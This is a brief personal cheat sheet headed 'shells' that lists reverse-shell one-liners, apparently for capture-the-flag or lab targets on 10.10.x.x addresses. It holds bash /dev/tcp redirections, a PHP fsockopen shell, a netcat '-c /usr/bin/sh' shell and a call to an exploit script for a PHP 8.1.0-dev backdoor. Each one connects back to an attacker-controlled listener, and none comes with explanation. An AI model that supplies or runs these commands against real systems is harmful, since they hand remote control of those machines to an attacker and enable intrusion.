# shells


bash tcpc
    bash -i >& /dev/tcp/10.10.14.14/4321 0>&1
    /usr/bin/bash -i >& /dev/tcp/10.10.14.14/80 0>&1

    /usr/bin/bash -l > /dev/tcp/10.10.10.14/80 0<&1 2>&1

    php -r "$sock=fsockopen('10.10.14.14',4321);exec('/usr/bin/bash -i <&3 >&3 2>&3');"



    /usr/bin/nc -c /usr/bin/sh 10.10.14.14 9001

    python3 revshell_php_8.1.0-dev.py http://10.10.10.242 10.10.10.14 9001